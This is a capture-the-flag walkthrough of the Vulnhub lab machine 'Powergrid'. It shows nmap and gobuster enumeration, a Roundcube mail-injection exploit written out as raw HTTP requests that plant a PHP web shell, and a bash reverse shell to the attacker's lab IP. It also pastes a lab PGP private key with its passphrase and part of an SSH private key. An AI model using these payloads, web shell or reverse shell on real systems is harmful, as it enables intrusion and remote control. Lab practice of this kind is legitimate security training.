* Machine: Powergrid
* Difficulty: Medium
* Platform: Vulnhub
* Date Solved: September 2, 2025

## Tools Used

## Enumeration
```bash
arp-scan -I wlo1 --localnet
ping -c 1 192.168.1.10

namp -p- --open --min-rate 5000 -sS -n -vvv -Pn -oG allPorts 192.168.1.10

nmap -sCV -p80,143,993 -oN targeted 192.168.1.10
whatweb http://192.168.1.10

nmap --script http-enum -p80 -oN webScan 192.168.1.10

gobuster dir -u http://192.168.1.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20

# We create a python script to bruteforce the login page in zmail

```
![alt text](image.png)

```bash
# login with credentials and view mail section
-----BEGIN PGP MESSAGE-----

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
RO1va5L9lriZ1vmP37FxIwsrCVVcNrPJxWydvw==
=fPY9
-----END PGP MESSAGE-----

# Searchsploit 
searchsploit roundcube
# ans
04731 >>> Recipient names must be specified
04731 <<< To: squinty@localhost
04731 <<< Subject: <?php phpinfo(); ?>
04731 <<< X-PHP-Originating-Script: 1000:rcube.php
04731 <<< MIME-Version: 1.0
04731 <<< Content-Type: text/plain; charset=US-ASCII;
04731 <<<  format=flowed
04731 <<< Content-Transfer-Encoding: 7bit
04731 <<< Date: So, 20 Nov 2016 04:02:52 +0100
04731 <<< From: example@example.com -OQueueDirectory=/tmp
04731 <<<  -X/var/www/html/rce.php
04731 <<< Message-ID: <390a0c6379024872a7f0310cdea24900@localhost>
04731 <<< X-Sender: example@example.com -OQueueDirectory=/tmp
04731 <<<  -X/var/www/html/rce.php
04731 <<< User-Agent: Roundcube Webmail/1.2.2
04731 <<<
04731 <<< Funny e-mail message
04731 <<< [EOF]

# We need to intercept email with burpsuite
POST /zmail/?_task=mail&_unlock=loading1757053596935&_lang=en_US&_framed=1 HTTP/1.1
Host: 192.168.1.10
Content-Length: 369
Cache-Control: max-age=0
Authorization: Basic cDQ4OmVsZWN0cmljbw==
Origin: http://192.168.1.10
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.10/zmail/?_task=mail&_action=compose&_id=82634021868ba8264c0c85
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: roundcube_sessid=3dvptnngkcdak6osb60omhiu4k; roundcube_sessauth=j2MwrzKyXe0SxuGtfvvFZpVWiJ-1757053500; language=en_US
Connection: keep-alive

_token=qAjPG2x4MPiW8ySdd1NjpuBfdJ1D5X8Q&_task=mail&_action=send&_id=82634021868ba8264c0c85&_attachments=&_from=example@example.com+-OQueueDirectory=/tmp+-X/var/www/html/rce.php&_to=test%40test.com&_cc=&_bcc=&_replyto=&_followupto=&_subject=<?php+phpinfo();+?>&editorSelector=plain&_priority=0&_store_target=Sent&_draft_saveid=&_draft=&_is_html=0&_framed=1&_message=test

# We need to create a wen shell
POST /zmail/?_task=mail&_unlock=loading1757054333937&_lang=en_US&_framed=1 HTTP/1.1
Host: 192.168.1.10
Content-Length: 383
Cache-Control: max-age=0
Authorization: Basic cDQ4OmVsZWN0cmljbw==
Origin: http://192.168.1.10
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.10/zmail/?_task=mail&_action=compose&_id=201478980068ba85325cdfb
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: roundcube_sessid=3dvptnngkcdak6osb60omhiu4k; language=en_US; roundcube_sessauth=j2MwrzKyXe0SxuGtfvvFZpVWiJ-1757054100
Connection: keep-alive

_token=qAjPG2x4MPiW8ySdd1NjpuBfdJ1D5X8Q&_task=mail&_action=send&_id=201478980068ba85325cdfb&_attachments=&_from=example@example.com+-OQueueDirectory=/tmp+-X/var/www/html/pwned.php&_to=test%40test.com&_cc=&_bcc=&_replyto=&_followupto=&_subject=<?php+system($_GET['cmd']);+?>&editorSelector=plain&_priority=0&_store_target=Sent&_draft_saveid=&_draft=&_is_html=0&_framed=1&_message=test

view-source:192.168.1.10/pwned.php?cmd=bash -c "bash -i >& /dev/tcp/192.168.1.9/443 0>&1"

# url encoded
view-source:192.168.1.10/pwned.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.9/443 0>%261"

nc -nlvp 443

-----BEGIN PGP PRIVATE KEY BLOCK-----

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
O/LG7NOgNrGl6THJtM0huhXOtewCOFA/
=KOs+
-----END PGP PRIVATE KEY BLOCK-----

# USE decrpt PGP passphrase : electrico

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAsBNVFExFUwpIaHIhMQDlu8mFwkNZWRFWBS5qE3BUUhk39/3CeAv2
81W7Z/63EM78eE1PjiccpNA5Vi2r+nfYLS6Nj7qy11BQsGlUKgmcxW79DdmC78LaFHUkYh
G3KtnJcLh4GAlPXoOwwXgwT8iu6dbxXGOzONCrWTTQ7/UjgJOcVIx9814uBDbZAYlXyjvN
aMnrO16Jff00wurmqNfq8D0lLWiU9Wq+9j5z+XvqHGaei3s3Wdhfoc3jtPfwUFsKSlVrQM
nj1i/43XOogwaPAThXRf21yfw5AIworT/xFHuAPlpWpT8z0KV8I4Z+DdiB4fHMtgWJ+t7O
pVzaZ0OP3XiGTXu4qjnRbsXMo/D8ZbGoiADbZnCLpjNlPKAA6HuPR+NmdnsKI/UnuQNjqz
NzBqME0Yrg9aEXUteHdk+mKb7Rppdz8EWYBtiYj+QReNV8DYX6CDl4yx51jTH7wN0Jb6lE
9p4ZOqmGat76j2KAtWAzF+6zLkf4Id+LXakzxC3tql+02kaYfVmq40gdwllIGocEJBT3D7
SWX8XL4KeOJW/1sY7HdoVCNuXSKz82/mtUmFB7hDUYpPse/GIAMbXn6lxURNc8LfkZXEVI
enSakNjjyK0VjUYIxc/sUAulXeuOxNjv3isHANxqcsYv0o+i2qgfAFxdsKkPML+bh0NGTL
MAAAdIKypuuSsqbrkAAAAHc3NoLXJzYQAAAgEAsBNVFExFUwpIaHIhMQDlu8mFwkNZWRFW
BS5qE3BUUhk39/3CeAv281W7Z/63EM78eE1PjiccpNA5Vi2r+nfYLS6Nj7qy11BQsGlUKg
mcxW79DdmC78LaFHUkYhG3KtnJcLh4GAlPXoOwwXgwT8iu6dbxXGOzONCrWTTQ7/UjgJOc
VIx9814uBDbZAYlXyjvNaMnrO16Jff00wurmqNfq8D0lLWiU9Wq+9j5z+XvqHGaei3s3Wd
hfoc3jtPfwUFsKSlVrQMnj1i/43XOogwaPAThXRf21yfw5AIworT/xFHuAPlpWpT8z0KV8
I4Z+DdiB4fHMtgWJ+t7OpVzaZ0OP3XiGTXu4qjnRbsXMo/D8ZbGoiADbZnCLpjNlPKAA6H
uPR+NmdnsKI/UnuQNjqzNzBqME0Yrg9aEXUteHdk+mKb7Rppdz8EWYBtiYj+QReNV8DYX6
CDl4yx51jTH7wN0Jb6lE9p4ZOqmGat76j2KAtWAzF+6zLkf4Id+LXakzxC3tql+02kaYfV
mq40gdwllIGocEJBT3D7SWX8XL4KeOJW/1sY7HdoVCNuXSKz82/mtUmFB7hDUYpPse/GIA
MbXn6lxURNc8LfkZXEVIenSakNjjyK0VjUYIxc/sUAulXeuOxNjv3isHANxqcsYv0o+i2q
gfAFxdsKkPML+bh0NGTLMAAAADAQABAAACAFXT9qMAUsKZvpX7HCbQ8ytInoUFY2ZBRxcb
euWi2ddzJ48hCUyPOH+BCOs2hHITE4po1SDL+/By96AEf1KGXMAZczPepBLEubBkh3w+V0
b+RSgdIPBSoQ9b0rJjRFAE/WaO5SuCTkgaFW0ZcyNRBcJC3kBU8SX+waeoUTjG29lvGsM0
